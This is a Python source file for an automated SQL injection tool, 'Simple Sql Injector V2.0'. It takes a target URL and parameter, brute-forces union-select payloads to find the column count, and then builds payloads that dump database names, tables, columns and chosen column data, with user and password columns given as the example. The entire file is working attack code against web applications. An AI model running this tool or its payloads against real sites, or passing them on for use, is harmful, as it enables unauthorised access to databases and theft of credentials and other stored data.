#Simple Sqlinjection Script Devloped By [AlqnasFox]
from requests import get,post
import binascii
import colorama
import json
from optparse import OptionParser
#set colors  
colorama.init()
GREEN  = colorama.Fore.GREEN
RED    = colorama.Fore.RED
YELLOW = colorama.Fore.YELLOW
CYAN   = colorama.Fore.CYAN
BLUE   = colorama.Fore.LIGHTBLUE_EX

def startmassage():
    print(f"{CYAN}#"+"*"*77+"#")
    print(f"{BLUE}| Script Name :            Simple Sql Injector [ V 2.0 ]                      |")
    print(f"{BLUE}| About Me    : [ Mohammad Abd Almoenam ] -Web Devloper- And -Ethical Hacker- |")
    print(f"{BLUE}| Facebook    :       ( https://www.facebook.com/alqnasfox )                  |")
    print(f"{BLUE}| Youtube     :  (https://www.youtube.com/channel/UCFEmcI1LJKYXgD5_PQ4rm-Q)   |")
    print(f"{BLUE}| My Website  :         ( https://alqnasfox.blogspot.com )                    |")
    print(f"{CYAN}#"+"*"*77+"#")
    print("\n")
startmassage()
opt = OptionParser()
#args
opt.add_option("--configfile",help="[*] To import Options And From [config.py] Example Use --configfile 1")
opt.add_option("-u","--url",help="* target url example.com")
opt.add_option("--method","-m",help="* method [get] or [post]")
opt.add_option("--data",help="* data to send with request")
opt.add_option("--weakkey",help="* parameter you think its weak to inject")
opt.add_option("--urlr",help="* if result show in onther place on site put the url that result show in")
opt.add_option("--headers","-H",help="* headers values like User-Agent")
#options
opt.add_option("--option",help="* get [databases] or [tables] or [columns] or [data] Example --option databases")
opt.add_option("-D","--database",help="* Database To extract Data From Example --option tables -D dvwa")
opt.add_option("-T","--table",help="* select tablename to extract columns example  --option columns -D dvwa -T users")
opt.add_option("-C","--columns",help="* select one or more columns to extract data example --option data -D dvwa -T users -C user,password")
(args, _)  = opt.parse_args()
if args.configfile == None:
	method  	= args.method
	url     	= args.url
	getdata  	= args.data
	weakkey 	= args.weakkey
	urlr        = args.urlr
	getheaders 	= args.headers
	option      = args.option
	database    = args.database
	tablename   = args.table
	dataex      = args.columns
else:
	import config
	method      = config.method
	url			= config.url
	getdata		= config.data
	weakkey		= config.weakkey
	urlr		= config.urlr
	getheaders  = config.headers
	option      = config.option 
	database    = config.database
	tablename   = config.tablename
	dataex      = config.dataex 

if method == None or url == None or getdata == None or weakkey == None:
    print("Insert Args method and url and data and weakkey")
    opt.print_help()
    exit(0)
if option == "tables":
    if database == None:
        print("[*] Insert Database name")
        opt.print_help()
        exit(0)
elif option == "columns":
    if tablename == None or database == None:
        print("[*] Insert Database Name And Table Name")
        opt.print_help()
        exit(0)
elif option == "data":
    if tablename == None or database == None or dataex == None:
        print("[*] Insert Database And Table And Columns")
        opt.print_help()
        exit(0)
elif option == "databases":pass
else:
    print("[*] Wrong Option");opt.print_help()
    exit(0)


data = {};headers={}
try:
    for x in getdata.split("&"):
        end = x.find("=")
        key = x[:end]
        val = x[end+1:]
        data[key]=val
    if getheaders != None:
        for x in getheaders.split("&"):
            end = x.find("=")
            key = x[:end]
            val = x[end+1:]
            headers[key]=val
        headers["User-Agent"]="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3492.0 Safari/537.36"
except:pass
if args.configfile != None:
	data = config.data
	headers=config.headers
report_path = url.split("/")[2]
#****************************************************
def connect(url):
	try:
		if method == "get":
			res = get(url,params=data,headers=headers)
			return res
		if method == "post":
			res = post(url,data=data,headers=headers)
			return res
	except:
		pass
		#exit(f"{RED}Connection To Target Cannot Be Made ...(-__-)")
def inject(columns_number=50):
	interfacevalue = "0x636F6D2E666F782E6E6574"#"com.fox.net"
	interface = [] #interfacevalue
	for i in range(columns_number):
		interface.append(interfacevalue)
		seprators    = ["1","1'","-1","-1'","a"]
		payload_ends = ["#"," -- -"," or '1'='1' --+'"," or 1=1 --+"," and '1'='1"]
		for sep in seprators:
			for pend in payload_ends:
				x = ",".join(interface)
				payload = f"{sep} union select {x} {pend}"
				data[weakkey] = payload
				res = connect(url)
				if urlr != None:
					res = get(urlr,headers=headers)
				try:
					if "com.fox.net" in res.text:
						testresult = {"payload":payload,"pstart":sep,"pend":pend,"columns":i+1}
						report = "{"
						report+= f'"payload":"{payload}","pstart":"{sep}","pend":"{pend}","columns":"{i+1}"'
						report+= "}"
						try:
							open(f"reports\\{report_path}.json","w").write(report)
						except:
							pass
						return testresult
				except:pass
	return 0
def genrate_extract_payload(option,testpayload,weakcolumn,database=None,tablename=None,data_to_extract=None):
	stag = "0x3C716E666F783E"
	etag = "0x3C2F716E666F783E"
	interface = []
	if option == "databases":
		code1 = f"concat({stag},schema_name,{etag})"
		code2 = "from information_schema.schemata"
	if option == "tables":
		database = "0x"+binascii.b2a_hex(database.encode()).decode()
		code1 = f"concat({stag},table_name,{etag})"
		code2 = f"FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN ({database})"
	if option == "columns":
		database  = "0x"+binascii.b2a_hex(database.encode()).decode()
		tablename = "0x"+binascii.b2a_hex(tablename.encode()).decode()
		code1 = f"concat({stag},column_name,{etag})"
		code2 = f"FROM INFORMATION_SCHEMA.columns WHERE table_name=({tablename}) AND table_schema={database}"
	if option == "data":
		code1 = f"concat({stag},{data_to_extract.replace(',',',0x3C2D2D3E,')},{etag})"
		code2 = f"from {database}.{tablename}"
	for x in range(1,testpayload['columns']+1):
		if x == weakcolumn:
			interface.append(code1)
		else:
			interface.append("null")
	x = ",".join(interface)
	payload = f"{testpayload['pstart']} union all select {x} {code2} {testpayload['pend']}"
	data[weakkey] = payload
	res = connect(url)
	if urlr != None:
		res = get(urlr,headers=headers)
	exresult = {"res":res.text,"exp":payload}
	return exresult
def get_saved_testpayload(path):
	try:
		testpayload = open(f'reports\\{path}.json',"r")
		return testpayload
	except:
		return 0
def html_parse(string,count=100):
    starttag = "<qnfox>"
    endtag   = "</qnfox>"
    result = []
    if string.find(starttag) == -1:
        return 0
    for i in range(count):
        start = string.find(starttag)+len(starttag)
        end   = string.find(endtag)
        if start == -1:
            break
        if end == -1:
            break
        result.append(f"{string[start:end]}")
        string = string[end+6:]
    return result

res = connect(url)
print(f"{YELLOW}[*] Injection Start On Target [{url}]")
try:
	print(f"{YELLOW}[*] Server Is [{res.headers['Server']}]")
except:
	pass
testpayload = get_saved_testpayload(report_path)
if testpayload != 0:
	testpayload = json.load(testpayload)
else:
	testpayload = inject()
testpayload['columns'] = int(testpayload['columns'])
if testpayload != 0:
	print(f"{CYAN}[*] Test Payload Is [{testpayload['payload']}] ")
	cheak = 0
	for i in range(testpayload['columns']):
		exresult = genrate_extract_payload(option,testpayload,i,database,tablename,dataex)
		exdata = html_parse(exresult['res'])
		if exdata != 0:
			cheak = 1
			break
	if cheak == 1:		
		print(f"{CYAN}[*] Extract Payload Is [{exresult['exp']}]")
		print(f"{GREEN}[+] Result : ")
		counter = 0
		for dt in exdata:
			counter+=1
			print(f"{GREEN}[{counter}] {dt}")
	if cheak == 0:	
		print(f"{RED}[-] No Result From Site (-__-)")
else:
	print(f"{RED}[-] All Tests Faild (-__-)")
